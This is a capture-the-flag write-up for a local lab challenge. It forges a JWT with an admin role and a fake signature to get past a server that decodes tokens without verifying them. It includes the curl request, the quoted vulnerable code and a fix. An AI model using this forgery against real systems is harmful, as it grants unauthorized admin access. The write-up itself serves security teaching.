# Level 1 Write-Up – TokenVault JWT CTF

**Challenge:** TokenVault – JWT Authentication (Level 1)  
**Vulnerability:** Missing JWT Signature Verification  
**Difficulty:** Easy  
**Flag:** `CTF{jwt_n0_v3r1fy_4lw4ys_trust_n3v3r}`

---

## Overview

Level 1 of the TokenVault challenge presents a web application that uses JWT (JSON Web Tokens) for authentication. The application has a login page, a profile endpoint, and an admin-only endpoint. The goal is to access the admin endpoint as a regular user.

The critical vulnerability is that the server uses `jwt.decode()` instead of `jwt.verify()` when processing incoming tokens. This means **the signature is never checked** — any token with any payload will be accepted as long as it is valid JSON encoded in the correct JWT format.

---

## Step 1: Initial Recon

We navigated to the application running at `http://localhost:3001`.

The interface presented a login form and described the app as a "credential vault" using JWT authentication. The info banner on the page revealed:

> *"The server calls jwt.decode() instead of jwt.verify()"*

We logged in with the provided credentials:

**Input:**
```
Username: alice
Password: password123
```

**Response from `POST /api/auth/login`:**
```json
{
  "message": "Login successful!",
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFsaWNlIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3MTIwMDAwMDAsImV4cCI6MTcxMjAwMzYwMH0.SOME_SIGNATURE",
  "user": { "username": "alice", "role": "user" }
}
```

We successfully obtained a JWT token for alice with `role: "user"`.

---

## Step 2: Analyzing the Token Structure

A JWT token has three Base64URL-encoded parts separated by dots:

```
HEADER.PAYLOAD.SIGNATURE
```

We decoded the payload (the middle part) using Base64:

```bash
echo "eyJ1c2VybmFtZSI6ImFsaWNlIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3MTIwMDAwMDAsImV4cCI6MTcxMjAwMzYwMH0" | base64 -d
```

**Decoded Payload:**
```json
{
  "username": "alice",
  "role": "user",
  "iat": 1712000000,
  "exp": 1712003600
}
```

This confirmed that the role is stored directly inside the JWT payload.

---

## Step 3: Crafting a Forged Token

Since the server does not verify the signature, we can change `"role": "user"` to `"role": "admin"` in the payload, re-encode it, and use the same header and any signature.

**New Payload (with admin role):**
```json
{
  "username": "alice",
  "role": "admin",
  "iat": 1712000000,
  "exp": 9999999999
}
```

**Base64URL-encode the new payload:**
```bash
echo -n '{"username":"alice","role":"admin","iat":1712000000,"exp":9999999999}' | base64
# Output: eyJ1c2VybmFtZSI6ImFsaWNlIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzEyMDAwMDAwLCJleHAiOjk5OTk5OTk5OTl9
```

**Constructed Forged Token:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFsaWNlIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzEyMDAwMDAwLCJleHAiOjk5OTk5OTk5OTl9.FAKESIGNATURE
```

> Note: The signature is completely fake — `FAKESIGNATURE` is not a valid HMAC. But it doesn't matter because the server never checks it.

---

## Step 4: Sending the Forged Token

We sent the forged token to the admin endpoint:

**Request:**
```bash
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFsaWNlIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzEyMDAwMDAwLCJleHAiOjk5OTk5OTk5OTl9.FAKESIGNATURE" \
  http://localhost:3001/api/admin
```

**Response:**
```json
{
  "message": "🎉 Admin access granted! You exploited the JWT vulnerability!",
  "flag": "CTF{jwt_n0_v3r1fy_4lw4ys_trust_n3v3r}",
  "logged_in_as": "alice",
  "vulnerability": "The server used jwt.decode() instead of jwt.verify(). The signature was never checked..."
}
```

**Flag captured!** ✅

---

## Why This Attack Worked

The vulnerable code in `src/utils/token.js`:

```javascript
// ⚠️ VULNERABLE
function decodeToken(token) {
  return jwt.decode(token); // No signature verification!
}
```

And in `src/middleware/authMiddleware.js`:

```javascript
const payload = decodeToken(token); // Just reads the payload — no check
req.user = payload;
```

The `jwt.decode()` function **only parses the Base64URL-encoded payload** — it does not verify that the HMAC-SHA256 signature matches. So any token with `"role": "admin"` in the payload is accepted, regardless of whether it was legitimately signed.

---

## Summary of Steps

| Step | Action | Result |
|------|--------|--------|
| 1 | Login as `alice` / `password123` | Received valid JWT with `role: user` |
| 2 | Decode the payload (Base64) | Confirmed `role` field is in the payload |
| 3 | Change `role: "user"` → `role: "admin"`, re-encode | Crafted a forged token with fake signature |
| 4 | Send forged token to `/api/admin` | Server accepted it — flag captured |

---

## Fix (See Level 3)

```javascript
// ✅ SECURE: Use verify() — checks signature AND expiry
function verifyToken(token) {
  return jwt.verify(token, SECRET, { algorithms: ['HS256'] });
}
```
